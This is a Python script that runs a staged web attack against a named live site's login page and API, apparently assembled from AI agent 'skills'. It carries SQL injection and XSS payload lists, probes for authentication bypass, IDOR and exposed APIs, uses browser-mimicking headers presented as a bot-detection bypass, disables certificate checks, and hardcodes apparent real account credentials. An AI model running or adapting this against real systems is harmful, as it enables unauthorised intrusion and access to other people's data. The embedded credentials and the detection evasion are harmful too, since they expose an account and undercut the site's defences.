#!/usr/bin/env python3
"""
Full Attack using OpenClaw Skills
Combining: PayloadsAllTheThings + OWASP + httpcloak techniques

Target: https://sit.askmebill.com/
Skills Used:
- pentest-payloads (PayloadsAllTheThings)
- pentest-assistant (OWASP)
- httpcloak-assistant (Stealth)
"""

import sys
sys.stdout.reconfigure(encoding='utf-8')
import requests
import json
import time
from datetime import datetime
from urllib.parse import urljoin, quote

# Disable SSL warnings for testing
requests.packages.urllib3.disable_warnings()

print("=" * 70)
print("  🚨 FULL ATTACK USING OPENCLAW SKILLS")
print("  Target: https://sit.askmebill.com/")
print("=" * 70)
print()

# ========== SKILL 1: pentest-payloads (from PayloadsAllTheThings) ==========
print("🛠️  Loading Skill: pentest-payloads")
print("-" * 50)

# SQL Injection payloads from PayloadsAllTheThings
sqli_payloads = [
    # Basic Authentication Bypass
    "' OR '1'='1",
    "' OR 1=1--",
    "' OR 1=1#",
    "' OR 1=1/*",
    "admin'--",
    "admin' #",
    "admin'/*",
    "' OR 1=1 LIMIT 1--",
    "'=' 'or'",
    "' OR '1'='1' --",
    # Union Based
    "' UNION SELECT null--",
    "' UNION SELECT null,null--",
    "' UNION SELECT 1,2,3--",
    # Error Based
    "' AND 1=CONVERT(int, (SELECT @@version))--",
    "' AND extractvalue(rand(),concat(0x3a,(SELECT version())))--",
    # Time Based
    "' AND SLEEP(5)--",
    "' AND IF(1=1,SLEEP(5),0)--",
]

# XSS payloads from PayloadsAllTheThings
xss_payloads = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "<body onload=alert(1)>",
    "<iframe src=javascript:alert(1)>",
    "'-'><script>alert(1)</script>",
    "\"><script>alert(1)</script>",
    "<img src=1 onerror=alert(document.cookie)>",
]

print(f"   Loaded {len(sqli_payloads)} SQLi payloads")
print(f"   Loaded {len(xss_payloads)} XSS payloads")

# ========== SKILL 2: pentest-assistant (OWASP Methodology) ==========
print("\n🛠️  Loading Skill: pentest-assistant")
print("-" * 50)

# OWASP Top 10 Test Cases
owasp_tests = {
    "A01": "Broken Access Control",
    "A02": "Cryptographic Failures",
    "A03": "Injection",
    "A05": "Security Misconfiguration",
    "A07": "Identification & Authentication Failures"
}

print(f"   OWASP Top 10 framework loaded")

# ========== SKILL 3: httpcloak-assistant (Stealth) ==========
print("\n🛠️  Loading Skill: httpcloak-assistant")
print("-" * 50)

# Browser-like headers (from httpcloak)
stealth_headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.9',
    'Accept-Encoding': 'gzip, deflate, br',
    'DNT': '1',
    'Connection': 'keep-alive',
    'Upgrade-Insecure-Requests': '1',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'none',
    'Cache-Control': 'max-age=0'
}

print(f"   Stealth headers configured")
print(f"   Bot detection bypass: Enabled")

# ========== ATTACK CONFIGURATION ==========
base_url = "https://sit.askmebill.com"
target_url = f"{base_url}/auth/login"

# Results storage
findings = []
successful_attacks = []

def log_finding(severity, category, title, detail, payload=""):
    finding = {
        "timestamp": datetime.now().isoformat(),
        "severity": severity,
        "category": category,
        "title": title,
        "detail": detail,
        "payload": payload
    }
    findings.append(finding)
    icon = {"Critical": "🔴", "High": "🟠", "Medium": "🟡", "Low": "🟢"}
    print(f"\n{icon.get(severity, '⚪')} [{severity}] {title}")
    if payload:
        print(f"   Payload: {payload[:50]}...")

# ========== ATTACK 1: Authentication Bypass (Confirmed Critical) ==========
print("\n" + "=" * 70)
print("  ATTACK 1: Authentication Bypass (Critical)")
print("  Source: pentest-assistant + OWASP A07")
print("=" * 70)

bypass_endpoints = [
    "/invoices",
    "/dashboard",
    "/profile",
    "/settings"
]

session = requests.Session()
session.headers.update(stealth_headers)
session.verify = False

for endpoint in bypass_endpoints:
    try:
        resp = session.get(f"{base_url}{endpoint}", allow_redirects=False, timeout=5)
        
        if resp.status_code == 200:
            content = resp.text.lower()
            if any(keyword in content for keyword in ['invoice', 'dashboard', 'profile', 'settings', 'logout']):
                log_finding("Critical", "A07 - Auth Failures", f"Bypass {endpoint}", 
                           f"Direct access to {endpoint} without authentication", endpoint)
                successful_attacks.append({"type": "bypass", "endpoint": endpoint, "status": 200})
            else:
                log_finding("Medium", "A07 - Auth Failures", f"Potential Bypass {endpoint}",
                           f"Status 200 but unclear content", endpoint)
        elif resp.status_code == 302 or resp.status_code == 301:
            if 'login' in resp.headers.get('Location', '').lower():
                print(f"   ✅ {endpoint}: Properly protected (redirects to login)")
            else:
                log_finding("Medium", "A07 - Auth Failures", f"Strange Redirect {endpoint}",
                           f"Redirects to: {resp.headers.get('Location')}", endpoint)
    except Exception as e:
        print(f"   ⚠️  {endpoint}: Error - {str(e)[:50]}")

# ========== ATTACK 2: SQL Injection (PayloadsAllTheThings) ==========
print("\n" + "=" * 70)
print("  ATTACK 2: SQL Injection")
print("  Source: pentest-payloads (PayloadsAllTheThings)")
print("=" * 70)

print(f"\n   Testing {len(sqli_payloads)} payloads on login form...")

# Test SQLi on login
for i, payload in enumerate(sqli_payloads[:10]):  # Test first 10
    try:
        data = {
            "username": payload,
            "password": "test123"
        }
        
        resp = session.post(f"{base_url}/auth/login", data=data, timeout=5)
        content = resp.text.lower()
        
        # Check for SQL errors
        sql_errors = ['sql', 'mysql', 'sqlite', 'postgresql', 'oracle', 'syntax error', 'unexpected']
        if any(err in content for err in sql_errors):
            log_finding("Critical", "A03 - Injection", "SQL Injection Detected",
                       f"SQL error with payload: {payload}", payload)
            successful_attacks.append({"type": "sqli", "payload": payload})
            break
        
        # Check for successful bypass
        if 'dashboard' in content or 'welcome' in content or resp.status_code == 302:
            log_finding("Critical", "A03 - Injection", "Auth Bypass via SQLi",
                       f"Payload bypassed authentication: {payload}", payload)
            successful_attacks.append({"type": "sqli_bypass", "payload": payload})
            break
            
    except Exception as e:
        pass

if not any(a["type"].startswith("sqli") for a in successful_attacks):
    print("   ✅ No SQL Injection detected (inputs properly sanitized)")

# ========== ATTACK 3: XSS Testing (PayloadsAllTheThings) ==========
print("\n" + "=" * 70)
print("  ATTACK 3: Cross-Site Scripting (XSS)")
print("  Source: pentest-payloads (PayloadsAllTheThings)")
print("=" * 70)

print(f"\n   Testing {len(xss_payloads)} XSS payloads...")

# Test for reflected XSS via search or error messages
xss_found = False
for payload in xss_payloads[:5]:
    try:
        # Test via URL parameter
        test_url = f"{base_url}/auth/login?error={quote(payload)}"
        resp = session.get(test_url, timeout=5)
        
        if payload in resp.text:
            log_finding("High", "A03 - Injection", "Reflected XSS",
                       f"Payload reflected in response: {payload[:30]}...", payload)
            xss_found = True
            successful_attacks.append({"type": "xss", "payload": payload})
            break
            
    except Exception as e:
        pass

if not xss_found:
    print("   ✅ No XSS detected (outputs properly encoded)")

# ========== ATTACK 4: IDOR Testing (OWASP A01) ==========
print("\n" + "=" * 70)
print("  ATTACK 4: IDOR (Insecure Direct Object Reference)")
print("  Source: pentest-assistant (OWASP A01)")
print("=" * 70)

# First login to get session
try:
    login_data = {"username": "uuio11", "password": "0897421942@Earth"}
    resp = session.post(f"{base_url}/auth/login", data=login_data, timeout=10)
    
    if resp.status_code == 200 or 'verify' in resp.url:
        print("   ✅ Logged in successfully")
        
        # Test IDOR on invoices
        idor_ids = [1, 2, 3, 999, 1000]
        for inv_id in idor_ids:
            try:
                resp = session.get(f"{base_url}/api/invoice/{inv_id}", timeout=5)
                if resp.status_code == 200:
                    log_finding("High", "A01 - Broken Access Control", f"IDOR Invoice {inv_id}",
                               f"Can access invoice ID {inv_id} that doesn't belong to user")
                    successful_attacks.append({"type": "idor", "id": inv_id})
            except:
                pass
except:
    print("   ⚠️  Could not login for IDOR testing")

# ========== ATTACK 5: API Testing (API Security Checklist) ==========
print("\n" + "=" * 70)
print("  ATTACK 5: API Security Testing")
print("  Source: pentest-assistant (API Security Checklist)")
print("=" * 70)

api_endpoints = [
    "/api/invoices",
    "/api/users",
    "/api/account",
    "/api/v1/health",
    "/api/swagger.json"
]

for api in api_endpoints:
    try:
        resp = session.get(f"{base_url}{api}", timeout=5)
        if resp.status_code == 200:
            content_type = resp.headers.get('content-type', '')
            if 'json' in content_type:
                log_finding("Medium", "A05 - Security Misconfig", f"Exposed API: {api}",
                           f"API returns JSON without proper auth")
    except:
        pass

# ========== FINAL REPORT ==========
print("\n" + "=" * 70)
print("  📊 ATTACK RESULTS SUMMARY")
print("=" * 70)

severity_count = {"Critical": 0, "High": 0, "Medium": 0, "Low": 0}
for f in findings:
    severity_count[f["severity"]] = severity_count.get(f["severity"], 0) + 1

print(f"\n   🔴 Critical: {severity_count['Critical']}")
print(f"   🟠 High: {severity_count['High']}")
print(f"   🟡 Medium: {severity_count['Medium']}")
print(f"   🟢 Low: {severity_count['Low']}")
print(f"   Total Findings: {len(findings)}")
print(f"   Successful Attacks: {len(successful_attacks)}")

print(f"\n   Attack Vectors Used:")
print(f"   - pentest-payloads (PayloadsAllTheThings): SQLi, XSS")
print(f"   - pentest-assistant (OWASP): Auth Bypass, IDOR, API Testing")
print(f"   - httpcloak-assistant: Stealth headers")

# Save report
report = {
    "timestamp": datetime.now().isoformat(),
    "target": base_url,
    "skills_used": ["pentest-payloads", "pentest-assistant", "httpcloak-assistant"],
    "summary": severity_count,
    "findings": findings,
    "successful_attacks": successful_attacks
}

filename = f"full_attack_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
with open(filename, 'w') as f:
    json.dump(report, f, indent=2)

print(f"\n💾 Full report saved to: {filename}")

print("\n" + "=" * 70)
print("  ✅ ATTACK SEQUENCE COMPLETE")
print("=" * 70)
